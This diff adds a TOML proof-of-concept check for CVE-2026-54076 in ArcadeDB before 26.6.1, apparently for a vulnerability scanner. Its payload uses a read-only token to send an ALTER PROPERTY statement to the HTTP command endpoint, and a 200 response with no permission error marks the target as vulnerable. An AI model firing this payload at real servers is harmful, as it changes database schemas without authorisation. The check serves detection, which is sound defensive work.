@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证ArcadeDB（<26.6.1）Schema权限绕过漏洞：使用只读API令牌通过HTTP命令端点执行ALTER PROPERTY DDL语句。若返回HTTP 200且响应中无权限拒绝错误，表明目标存在CVE-2026-54076未授权Schema篡改漏洞。CVE-2026-44221的修复仅对LocalDocumentType.createProperty方法添加了UPDATE_SCHEMA权限检查，但ALTER PROPERTY/DROP PROPERTY/ALTER TYPE等方法未做检查，导致只读身份可修改数据库Schema。"
+id = "POC-AVE-2026-0474"
+name = "CVE-2026-54076 ArcadeDB Schema Authorization Bypass PoC"
+severity = "high"
+tags = ["ave-2026-0474"]
+vuln_id = [
+    "CVE-2026-54076",
+    "AVE-2026-0474",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/command/{{Database}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"language":"sql","command":"ALTER PROPERTY TestType.TestProp MANDATORY false"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Basic {{ReadonlyAuth}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "permission",
+    "UPDATE_SCHEMA",
+    "not authorized",
+    "unauthorized",
+    "Insufficient privileges",
+]
